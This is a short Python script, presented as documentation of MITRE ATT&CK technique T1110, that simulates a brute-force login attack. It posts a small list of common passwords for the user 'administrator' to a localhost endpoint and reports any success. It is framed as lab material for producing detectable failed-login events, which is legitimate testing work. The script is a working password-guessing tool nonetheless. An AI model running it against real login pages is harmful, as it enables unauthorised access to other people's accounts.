# < ---- DOCUMENTATION OF MITRE ATT&CK TECHNIQUE ---- >
# T1110 - Brute Force
# Objective: Adversaries may attempt to gain access to accounts by systematically guessing passwords. This script simulates a brute force attack against a fake login endpoint.

# t1110_brute_force.py
import requests
import time

# --- Simulation Configuration ---
# A fake login URL. In a lab, you would set up a web app with this endpoint.
LOGIN_URL = "http://127.0.0.1:8080/login"
USERNAME = "administrator"
# A small list of common passwords for demonstration
PASSWORD_LIST = ["password", "123456", "admin", "qwerty", "Password123!"]

def simulate_brute_force(url, username, passwords):
    """
    Simulates T1110 by sending a series of login requests with different passwords.
    This will generate a high volume of failed login events, which is a key indicator.
    """
    print(f"[*] T1110 Simulation: Brute forcing password for user '{username}' at '{url}'")
    
    for password in passwords:
        print(f"[*] Trying password: '{password}'")
        try:
            # Prepare the payload for a typical POST login form
            payload = {
                'username': username,
                'password': password
            }
            response = requests.post(url, data=payload, timeout=5)
            
            # Check the response status code or content for success/failure
            if response.status_code == 200 and "login successful" in response.text.lower():
                print(f"[+] SUCCESS! Found password: '{password}'")
                return
            else:
                print(f"[-] FAILED. Status Code: {response.status_code}")
        
        except requests.exceptions.RequestException as e:
            print(f"[!] Could not connect to {url}. Ensure a test server is running. Error: {e}")
            break
        
        # Small delay to avoid overwhelming a real server and to simulate human-like behavior
        time.sleep(1)
    
    print("[-] Brute force simulation completed. Password not found in the list.")

if __name__ == "__main__":
    simulate_brute_force(LOGIN_URL, USERNAME, PASSWORD_LIST)